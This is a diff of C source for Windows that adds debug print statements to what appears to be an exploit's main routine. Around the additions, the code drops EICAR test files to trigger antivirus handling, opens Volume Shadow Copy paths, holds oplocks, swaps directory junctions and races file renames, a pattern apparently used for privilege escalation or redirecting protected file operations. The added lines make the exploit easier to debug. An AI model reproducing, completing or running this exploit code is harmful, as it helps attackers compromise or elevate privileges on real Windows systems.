@@ -78993,6 +78993,7 @@ int main()
 
 	wchar_t vsspath[MAX_PATH] = { 0 };
 	ShadowCopyFinderThread(vsspath);
+	printf("[DEBUG] VSS path: %ws\n", vsspath);
 	CloseHandle(heicar);
 	HANDLE hvss = NULL;
 	wchar_t vsswinpath[MAX_PATH] = { 0 };
@@ -79003,6 +79004,7 @@ int main()
 	InitializeObjectAttributes(&objattr2, &_vsswinpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 	iostat = { 0 };
 	NTSTATUS stat = NtCreateFile(&hvss, GENERIC_READ | SYNCHRONIZE, &objattr2, &iostat, NULL, NULL, NULL, FILE_OPEN, NULL, NULL, NULL);
+	printf("[DEBUG] NtCreateFile(VSS WDFOO stream) = 0x%08X, vsswinpath=%ws\n", stat, vsswinpath);
 
 		DeviceIoControl(hvss, FSCTL_REQUEST_OPLOCK, &opin, sizeof(opin), &opout, sizeof(opout), &cb, &ovoplock);
 		WaitForSingleObject(ovoplock.hEvent, INFINITE);
@@ -79012,11 +79014,17 @@ int main()
 
 	
 	NTSTATUS delstat = NtCreateFile(&hc, DELETE, &delobjattr, &deliostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SUPERSEDE, NULL, NULL, NULL);
+	printf("[DEBUG] NtCreateFile(delobj) = 0x%08X\n", delstat);
 	MoveToTempDir(hc);
+	printf("[DEBUG] MoveToTempDir done\n");
 
 	
 	if (!CreateJunction(hdir, mntpath))
+	{
+		printf("[DEBUG] CreateJunction #1 (hdir -> mntpath=%ws) FAILED\n", mntpath);
 		return 1;
+	}
+	printf("[DEBUG] CreateJunction #1 (hdir -> mntpath=%ws) OK\n", mntpath);
 		
 	if (hc)
 		CloseHandle(hc);
@@ -79025,20 +79033,26 @@ int main()
 	do {
 		ZeroMemory(buff, sizeof(buff));
 		DWORD retbytes = NULL;
+		printf("[DEBUG] Waiting for ReadDirectoryChangesW (FILE_NAME change)...\n");
 		ReadDirectoryChangesW(hwin, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &retbytes, NULL, NULL);
 		PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
+		printf("[DEBUG] ReadDirectoryChangesW returned: FileName=%ws, Action=%d, FileNameLength=%d\n", 
+			pfni->FileNameLength > 0 ? pfni->FileName : L"(null)", pfni->Action, pfni->FileNameLength);
 		if (pfni->FileNameLength / 2 != 24 || _wcsnicmp(&pfni->FileName[0], teststr, 8) != 0)
 			continue;
 		break;
 	} while (1);
+	printf("[DEBUG] ReadDirectoryChangesW: detected expected rename, proceeding.\n");
 
 
 	wchar_t workdir2[MAX_PATH] = {L"\\??\\"};
 	wcscat(workdir2, workdir);
 	if (!CreateJunction(hdir, dirtmp))
 	{
+		printf("[DEBUG] CreateJunction #2 (hdir -> dirtmp) FAILED\n");
 		return 1;
 	}
+	printf("[DEBUG] CreateJunction #2 (hdir -> dirtmp=%ws) OK\n", dirtmp);
 
 	wchar_t lockpath[MAX_PATH] = { 0 };
 	// The lock file must be accessible via the junction.
@@ -79057,8 +79071,10 @@ int main()
 	iostat = { 0 };
 
 	CloseHandle(WriteEicar(maindirname, g_using_vhd ? mntpath : NULL));
+	printf("[DEBUG] WriteEicar #2 done. lockpath=%ws\n", lockpath);
 
 	stat = NtCreateFile(&hlock1, GENERIC_READ, &lockpathobjattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, NULL, NULL, NULL);
+	printf("[DEBUG] NtCreateFile(lockpath=%ws) = 0x%08X\n", lockpath, stat);
 	if (stat)
 	{
 		printf("Failed to open file : %ws, error : 0x%0.8X\n", lockpath, stat);
